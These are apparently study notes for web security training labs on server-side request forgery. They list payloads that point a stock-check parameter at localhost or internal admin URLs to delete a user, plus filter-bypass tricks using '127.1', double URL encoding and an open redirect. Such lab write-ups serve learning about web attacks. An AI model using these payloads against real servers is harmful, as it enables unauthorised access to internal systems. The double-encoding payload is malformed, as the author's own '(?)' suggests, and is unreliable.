### Basic SSRF against the local server

There is a stockApi parameter that is fetching an internal resource, so you can specify an internal resource, in this case: `http://localhost/admin/delete?username=carlos

---
### Basic SSRF against another back-end system

The same as previous, but it says you need to find the endpoint within the range of the given IP, so it will be:

`http://192.168.0.§AAA§:8080/admin/delete?username=carlos` in the intruder until solved

---
### Blind SSRF with out-of-band detection

Go to a product detail, and in this case, you can modify the "Referer" header and replace it with a Burp collaborator. You will find the poll in the "collaborator" tab

---
### SSRF with blacklist-based input filter

In this case, when you use the normal payload `https://localhost/admin/delete?username=carlos` you will see it's filtering it, so you need to bypass it. 

In this case:
`http://127.1/%25%35&31dmin/delete?username=carlos` you double URL encode the "a" and replace the localhost for "127.1"  (?)

---
###  SSRF with filter bypass via open redirection vulnerability

After moving trough the app, you'll see that the "Next Product" button has a "path" value specified via querystring. 
This give us the clue that, in the "stockApi" value, we need to inject something like this:
`/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
